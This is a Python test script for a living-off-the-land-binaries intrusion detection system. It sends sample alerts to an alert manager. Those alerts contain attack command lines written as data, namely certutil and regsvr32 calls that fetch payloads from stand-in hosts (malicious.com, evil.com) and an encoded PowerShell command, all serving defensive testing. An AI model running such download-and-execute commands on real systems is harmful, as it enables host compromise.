# test_generate_alerts.py
import sys
import os
import json
import logging
from datetime import datetime

# Define config path
config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')

# Add the project root directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from src.alerts.alert_system import AlertManager
from src.database.connection import DatabaseConnection


from src.alerts.alert_system import AlertManager
from src.rules.rule_engine import RuleEngine



# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Create config file with MongoDB explicitly enabled
config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
config = {
    "alert_methods": {
        "console": True,
        "file": True,
        "email": False,
        "mongodb": True
    },
    "mongodb_config": {
        "connection_string": "mongodb://localhost:27017/",
        "db_name": "lolbins_ids"
    },
    "alert_levels": ["critical", "high", "medium"],
    "alert_file": "alerts.json"
}

# Write the config to file
print(f"Writing config to: {config_path}")
with open(config_path, 'w') as f:
    json.dump(config, f, indent=2)

# Create alert manager with explicit config path
print(f"Initializing AlertManager with config: {config_path}")
alert_manager = AlertManager(config_file=config_path)

# Print alert methods to check which ones were initialized
print(f"Alert methods initialized:")
for method in alert_manager.alert_methods:
    print(f"  - {method.__class__.__name__}")

# Create a test alert
alert_manager = AlertManager()

# Sample alerts
test_alerts = [
    {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'rule_name': "PowerShell Encoded Command",
        'description': "PowerShell executing encoded commands",
        'severity': 4,
        'process_name': "powershell.exe",
        'command_line': "powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==",
        'pid': 1001,
        'username': "admin"
    },
    {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'rule_name': "CertUtil Download",
        'description': "CertUtil used to download files from internet",
        'severity': 4,
        'process_name': "certutil.exe",
        'command_line': "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\file.exe",
        'pid': 1002,
        'username': "admin"
    },
    {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'rule_name': "Regsvr32 AppLocker Bypass",
        'description': "Regsvr32 used to bypass AppLocker",
        'severity': 5,
        'process_name': "regsvr32.exe",
        'command_line': "regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll",
        'pid': 1003,
        'username': "dev-user"
    }
]

# Send the test alerts
for alert in test_alerts:
    logging.info(f"Sending test alert: {alert['rule_name']}")
    alert_manager.send_alert(alert)

logging.info("All test alerts sent!")

try:
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            config = json.load(f)
            
        # Ensure MongoDB is enabled
        if "alert_methods" not in config:
            config["alert_methods"] = {}
        config["alert_methods"]["mongodb"] = True
        
        # Write updated config back
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        print(f"Config updated at: {config_path}")
    else:
        # Create new config file with MongoDB enabled
        config = {
            "alert_methods": {
                "console": True,
                "file": True,
                "email": False,
                "mongodb": True
            },
            "mongodb_config": {
                "connection_string": "mongodb://localhost:27017/",
                "db_name": "lolbins_ids"
            },
            "alert_levels": ["critical", "high", "medium"],
            "alert_file": "alerts.json"
        }
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        print(f"New config created at: {config_path}")
        
except Exception as e:
    print(f"Error updating config: {str(e)}")